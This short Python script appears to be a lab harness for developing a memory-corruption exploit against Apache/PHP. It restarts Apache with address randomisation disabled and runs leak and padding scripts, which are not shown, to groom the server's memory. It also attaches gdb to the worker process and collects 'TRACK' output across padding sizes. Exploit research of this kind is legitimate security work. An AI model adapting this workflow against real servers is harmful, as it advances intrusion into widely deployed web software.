#!/usr/bin/env python3
import subprocess,time,re,sys
def sh(c,timeout=60): return subprocess.run(c,shell=True,cwd='/home/debian/php-lab',capture_output=True,text=True,timeout=timeout)
def restart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.3)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.4)
def child():
    out=sh('pgrep -f "^/usr/sbin/apache2 -k start"').stdout.split()
    return out[-1] if len(out)>=2 else None
def trial(P):
    restart()
    sh("python3 send_a_leak2.py 1001 12 >/dev/null 2>&1"); time.sleep(0.12)
    sh("python3 b_numleak2.py 892 1 0x1000 >/dev/null 2>&1"); time.sleep(0.12)
    sh("python3 send_a_leak3.py 1001 5 39 12 17 >/dev/null 2>&1"); time.sleep(0.12)
    sh("python3 b_target.py 443 16 983 >/dev/null 2>&1"); time.sleep(0.12)
    w=child()
    if not w: return "no child"
    log=f"/tmp/r0_{P}.log"
    sh(f"rm -f {log}")
    sh(f"(sudo -n gdb -q -p {w} -batch -x r0.gdb >{log} 2>&1 &) ; sleep 0.6")
    pads=" ".join(["7:7"]*P)
    sh(f"python3 send_a_pad.py 17 19 3 12 {pads} >/dev/null 2>&1",40); time.sleep(0.5)
    sh(f"sudo -n pkill -f 'gdb -q -p {w}' >/dev/null 2>&1")
    out=sh(f"grep -E 'TRACK' {log}").stdout.strip()
    return out or "no TRACK"
for P in [640,646,652,658]:
    print(f"P={P} {trial(P)}",flush=True)
